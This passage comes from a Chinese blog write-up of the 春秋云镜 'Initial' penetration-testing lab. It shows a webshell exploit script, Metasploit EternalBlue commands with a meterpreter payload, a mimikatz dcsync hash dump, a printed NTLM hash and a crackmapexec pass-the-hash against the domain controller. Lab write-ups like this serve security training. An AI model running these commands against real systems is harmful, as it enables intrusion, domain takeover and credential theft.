class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>这里运行python脚本的时候可以挂上proxifier。</p>
+<p><img src="/./Initial.assets/1733128284741-176771cd-5f31-4310-bb7d-d8c8430e9c5e.png" alt="img"></p>
+<p>然后就可以直接python脚本去打了，本身是达不到内网的，这样相当于挂上了代理。同时后面蚁剑也就不用配置一遍代理了。</p>
+<p><img src="/./Initial.assets/1733128193243-d7bc8685-7479-4dca-a596-21f1e80c2751.png" alt="img"></p>
+<p>然后上蚁剑连接即可。然后我们可以在C:&#x2F;Users&#x2F;Administrator&#x2F;flag里面找到flag02.txt文件。</p>
+<p><img src="/./Initial.assets/1733128372462-b965f366-7374-4f9c-b252-d4c0f39a532e.png" alt="img"></p>
+<p>得到第二段flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2ce3-4813-87d4-</span><br></pre></td></tr></table></figure>
+
+<p>拼接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;60b53231-2ce3-4813-87d4-</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>然后这个flag文件里面是有提示的，叫我们去攻击DC。这台根据前面ai分析版本较新可能不好拿到更高权限，所以我们直接用永恒之蓝那台。上kali。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">setg proxies socks5 ip:1234</span><br><span class="line"></span><br><span class="line">setg ReverseAllowProxy true</span><br><span class="line"></span><br><span class="line">search ms17_010</span><br></pre></td></tr></table></figure>
+
+<p>我们选择第一个就行了，use 0。</p>
+<p>我们还需要修改payload。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line"></span><br><span class="line">set RHOSTS 172.22.1.21</span><br></pre></td></tr></table></figure>
+
+<p>去正向连接。但是我这么设置好像不行？用proxychains4 msfconsole就行了。</p>
+<p><img src="/./Initial.assets/1733129989565-9bf52769-6f19-48af-a5ae-48ceb082895b.png" alt="img"></p>
+<p>成功攻击。这里我们利用永恒之蓝打完后就是system权限了。</p>
+<p><img src="/./Initial.assets/1733130211722-cb158ee7-732a-4d71-aa5b-7079214c5b75.png" alt="img"></p>
+<p>前面我们已经收集到了域的一些信息。</p>
+<p>所在域为：xiaorang.lab</p>
+<p>收集域内用户hash。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./Initial.assets/1733130294558-be925a4a-6ddf-4fd1-a2fb-3a0333da08ca.png" alt="img"></p>
+<p>可以拿到administrator的hash。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10cf89a850fb1cdbe6bb432b859164c8</span><br></pre></td></tr></table></figure>
+
+<p> 再用crackmapexec打PTH拿下域控。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./Initial.assets/1733131103037-e26b4df6-5bfc-4eae-a2bf-414a35d1e55c.png" alt="img"></p>
+<p>攻击成功，拿到最后一个flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8f88d0d43d6&#125;</span><br></pre></td></tr></table></figure>
+
+<p>总的flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;60b53231-2ce3-4813-87d4-e8f88d0d43d6&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12115?time__1311=GqGxRDuDg7iQi=D/Y2KBKefgDn0c3=a4D">https://xz.aliyun.com/t/12115?time__1311=GqGxRDuDg7iQi%3DD%2FY2KBKefgDn0c3%3Da4D</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/uuzeray/article/details/141316323">https://blog.csdn.net/uuzeray/article/details/141316323</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Articles</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/friends/">Friends</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">2.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">3.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">4.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">5.</span> <span class="toc-text">参考文章</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/12/02/Initial/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/12/02/Initial/&text=春秋云镜-Initial"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/12/02/Initial/&title=春秋云镜-Initial"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/12/02/Initial/&is_video=false&description=春秋云镜-Initial"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云镜-Initial&body=Check out this article: http://example.com/2024/12/02/Initial/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/12/02/Initial/&title=春秋云镜-Initial"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/12/02/Initial/&title=春秋云镜-Initial"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/12/02/Initial/&title=春秋云镜-Initial"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/12/02/Initial/&title=春秋云镜-Initial"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/12/02/Initial/&name=春秋云镜-Initial&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/12/02/Initial/&t=春秋云镜-Initial"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025
+    Mash1r0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
